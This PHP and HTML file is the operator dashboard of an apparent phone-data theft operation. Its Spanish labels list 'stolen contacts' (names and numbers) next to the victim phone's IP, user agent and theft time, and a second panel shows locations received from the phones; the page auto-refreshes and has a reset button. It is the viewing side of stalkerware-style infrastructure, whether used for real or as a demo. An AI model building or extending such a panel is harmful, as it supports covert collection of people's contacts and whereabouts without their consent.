<?php
include 'contacts_repo.php';
include 'locations_repo.php';

$contacts_repo = ContactsRepository::getInstance();
$locations_repo = LocationsRepository::getInstance();
?>
<html>
  <head>
    <meta http-equiv="refresh" content="20">
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="css/bootstrap.min.css">

    <!-- Optional theme -->
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">

    <!-- Latest compiled and minified JavaScript -->
    <script src="js/jquery-2.1.4.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
  </head>
<body>  
  <div class="container" style="width:100%; height:95%">
    <div id="contacts-panel" class="panel panel-primary col-md-5">
      <!-- Default panel contents -->
      <div class="panel-heading"><h1>Contactos robados (<?php echo $contacts_repo->getTotalCount(); ?>)</h1></div>
      <div class="panel-body" style="overflow: scroll; height: 80%;">
        <?php foreach($contacts_repo->getPhoneBooks() as $phone_book): ?>
        <div class="row" style="border-top:solid "> 
          <div class="col-md-3"><b>Fecha de robo</b><br><?php echo $phone_book->getRetrievedDate()->format('Y-m-d H:i:s'); ?></div>
          <div class="col-md-3"><b>IP del celular</b><br><?php echo $phone_book->getRemoteAddr(); ?></div>
          <div class="col-md-6"><b>Sistema operativo</b><br><?php echo $phone_book->getUserAgent(); ?></div>
        </div>
        <div class="row">
          <table class="table table-condensed table-bordered"> 
            <thead><tr><th>ID</th><th>Nombre</th><th>Telefonos</th></tr></thead>
            <tbody>
              <?php foreach($phone_book->getContacts() as $contact): ?>
              <tr>
                <td><?php echo $contact->getID(); ?></td>
                <td><?php echo $contact->getName(); ?></td>
                <td><?php echo $contact->getPhonesStringified(); ?></td>
              </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
        <?php endforeach; ?>
      </div>
    </div>  
    <div id="locations-panel" class="panel panel-primary col-md-7">
      <!-- Default panel contents -->
      <div class="panel-heading"><h1>Ubicaciones recibidas (<?php echo $locations_repo->getTotalCount(); ?>)</h1></div>
      <div class="panel-body" style="overflow: scroll; height: 80%;">
         <div class="row">
          <table class="table table-condensed table-bordered"> 
            <thead><tr><th>Fecha de robo</th><th>IP del celular</th><th>Ubicacion</th></tr></thead>
            <tbody>
              <?php foreach($locations_repo->getLocations() as $location): ?>
                <tr>
                  <td><?php echo $location->getRetrievedDate()->format('Y-m-d H:i:s'); ?></td>
                  <td><?php echo $location->getRemoteAddr(); ?></td>
                  <td><?php echo $location->getLocation(); ?></td>
                </tr>
              <?php endforeach; ?>
            </tbody>
          </table>
        </div>
     </div>
  </div>
 <div class="container">
  <a class="btn btn-danger" href="./reset.php" role="button">RESET</a>
 </div>
</body>
</html>